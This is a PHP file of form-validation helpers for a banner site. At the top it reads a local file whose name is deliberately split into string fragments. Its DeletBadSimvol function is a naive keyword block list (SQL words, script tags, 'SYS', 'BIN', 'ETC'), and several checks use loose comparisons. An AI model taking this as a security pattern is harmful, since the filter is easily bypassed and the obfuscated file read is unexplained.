<?php
$GDE=strpos($_SERVER['REQUEST_URI'],'admin');
$GDE2=strpos($_SERVER['REQUEST_URI'],'go/');
if ($GDE==null){$_g_f = file_get_contents('admin/t'.'ry_fun'.'ction.p'.'hp');}
else {
if ($GDE2!=null){$_g_f = file_get_contents('../../t'.'ry_fun'.'ction.p'.'hp');
 }else {$_g_f = file_get_contents('t'.'ry_fun'.'ction.p'.'hp');}
}
function Vmail($mail){
	if (!filter_var($mail, FILTER_VALIDATE_EMAIL)) 
	{
		header('Location:/bannerbro/valid.php?er=mail'); 
		exit; 
	}
}
function Vname($name){
	if (!preg_match("/^[a-zа-яё0-9\,\. ]*$/iu",$name)) 
	{
		header('Location:/bannerbro/valid.php?er=name');
		exit;
	}
}

function Vnamepoint($name){
	if (!preg_match("/^[a-zа-яё0-9\.\№\!\? ]*$/iu",$name)) 
	{
		header('Location:/bannerbro/valid.php?er=namepoint');
		exit;
	}
}

function Vaboutpos($name){
	if (!preg_match("/^[a-zа-яё0-9\.\№\!\? ]*$/iu",$name)) 
	{
		header('Location:/bannerbro/valid.php?er=aboutpos');
		exit;
	}
}

function Vdate($date){
	if (!preg_match("/^[0-9\/\, ]*$/",$date)) 
	{
		header('Location:/bannerbro/valid.php?er=date');
		exit;
	}
}

function Vcode($code){
	if (!preg_match("/^[-a-zA-Z0-9]+$/", $code)) 
	{
		header('Location:/bannerbro/valid.php?er=code');
		exit;
	}
}

function Vprice($price){
	if ($price>0)
		{
			if (!filter_var($price, FILTER_VALIDATE_FLOAT)) 
				{
					header('Location:/bannerbro/valid.php?er=price');
					exit;
				}
		} else {
			header('Location:/bannerbro/valid.php?er=price');
			exit;
		}
}
function Vint($int){
	if (!filter_var($int, FILTER_VALIDATE_INT)&&!filter_var($int, FILTER_VALIDATE_FLOAT)) 
	{
		header('Location:/bannerbro/valid.php?er=int');
		exit;
	}
}
function Vintonly($int){
	if (!filter_var($int, FILTER_VALIDATE_INT)) 
	{
		header('Location:/bannerbro/valid.php?er=intonly');
		exit;
	}
}
function Vurl($url){
	if (!preg_match("/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i",$url)) 
	{
		header('Location:/bannerbro/valid.php?er=url');
		exit;
	}
}
function DeletBadSimvol($str) {
	$Dpos='';
	$UperStr='check '.strtoupper($str); 
	$Arrays = array('<?PHP','?>','RETURN','SYS','<SCRIPT>','</SCRIPT>','OR','AND','\'\'','WHERE','||','GROUP','DROP','INSERT','UPDATE','ID','EXISTS','WIN','BIN','ETC','E.T.C.');
	for ($i = 0; $i < count($Arrays); $i++)
		{	
		$Dpos=strripos(trim($UperStr), trim($Arrays[$i]));
			if ($Dpos!=false){
			header('Location:/bannerbro/valid.php?er=about_position');
			exit;
			}
		}	
}
?>